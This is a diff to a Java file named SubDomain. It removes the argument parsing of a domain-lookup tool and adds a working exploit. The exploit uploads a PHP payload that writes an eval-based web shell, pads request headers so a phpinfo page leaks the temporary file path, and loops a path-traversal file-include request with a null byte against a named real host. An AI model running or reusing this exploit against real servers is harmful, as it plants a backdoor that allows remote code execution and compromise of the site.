@@ -9,8 +9,12 @@ import java.util.Arrays;
 import java.util.Collections;
 import java.util.Comparator;
 import java.util.HashMap;
+import java.util.HashSet;
 import java.util.Iterator;
 import java.util.List;
+import java.util.Map;
+import java.util.Map.Entry;
+import java.util.Set;
 import java.util.TreeSet;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
@@ -20,51 +24,43 @@ import org.xbill.DNS.*;
 public class SubDomain{
 	public static void main(String[] args) throws Exception 
 	{
-		int threads=20;int option=0;
-		if(args.length<1)
+		String padding = "";
+		for(int i=0;i<8000;i++)
 		{
-			System.out.println("------------------------------------------------------");
-			System.out.println("Use: java -jar DomainInfo.jar filename -t threads -c -s");
-			System.out.println("Exa: java -jar DomainInfo.jar www.txt");
-			System.out.println("Exa: java -jar DomainInfo.jar www.txt -t 20 -c -s");
-			System.out.println("Exa: java -jar DomainInfo.jar -h");
-			System.out.println("------------------------------------------------------");
-			System.exit(0);
+			padding = padding + "A";
 		}
-		String argvs = Arrays.toString(args);
-		if(argvs.indexOf("-h")>0)
+		HashMap<String,String> headers = new HashMap<>();
+		String str="----------1918641284\r\n"
+				  +"Content-Disposition: form-data; name=\"id\"; filename=\"wooyun.txt\"\r\n"
+				  +"\r\n"
+				  +"<?php file_put_contents('./cache/wy.php','<?php eval($_POST[\'wooyun\']);?>') ? print('wooyun_true') : print('wooyun_false');?>"
+				  +"\r\n----------1918641284\r\n";
+		headers.put("Content-type", "multipart/form-data; boundary=--------1918641284");
+		headers.put("User-Agent", padding);
+		headers.put("Accept", padding);
+		headers.put("Accept-Language", padding);
+		headers.put("Pragma", padding);
+		headers.put("Cookie", "PHPSESSID=q249llvfromc1or39t6tvnun42; padding="+padding+";");
+		String includeurl = "http://price.ziroom.com/?_p=../../../../../../../..{include}%00.html";
+		String phpinfourl = "http://price.ziroom.com/phpinfo.php?a="+padding;
+		while(true)
 		{
-			System.out.println("-t set the thread numbers");
-			System.out.println("-c read the response code of the domain");
-			System.out.println("-s read the response server of the domain");
-			System.exit(0);
+			String phptmp = SubDomain.getPhptmp(Request.doPost(phpinfourl,str,headers));
+			String get = includeurl.replaceFirst("\\{include\\}", phptmp);
+			String data = Request.doGet(get);
+			System.out.println(get);
+			System.out.println(data);
 		}
-		if(argvs.indexOf("-t")>0)
+	}
+	public static String getPhptmp(String data)
+	{
+		String tmp = null;
+		Matcher m = Pattern.compile("\\[tmp_name] =&gt;\\s(.*?)\\s").matcher(data);
+		if(m.find())
 		{
-			Matcher m = Pattern.compile("-t,\\s(\\d{1,3})").matcher(argvs);
-			if(m.find())
-			{
-				threads = Integer.parseInt(m.group(1));
-			}
+			tmp = m.group(1);
 		}
-		if(argvs.indexOf("-c")>0 && argvs.indexOf("-s")>0)
-		{
-			option=3;
-		}else if(argvs.indexOf("-c")>0 && argvs.indexOf("-s")<0)
-		{
-			option=1;
-		}else if(argvs.indexOf("-c")<0 && argvs.indexOf("-s")>0)
-		{
-			option=2;
-		}else
-		{
-			option=0;
-		}
-		DomainInfoThread sd = new DomainInfoThread(args[0],option);
-		for(int i=0;i<threads;i++)
-		{
-			new Thread(sd,String.valueOf(i)).start();
-		}
+		return tmp;
 	}
 	public static String getDomain(String url,int type) throws Exception
 	{
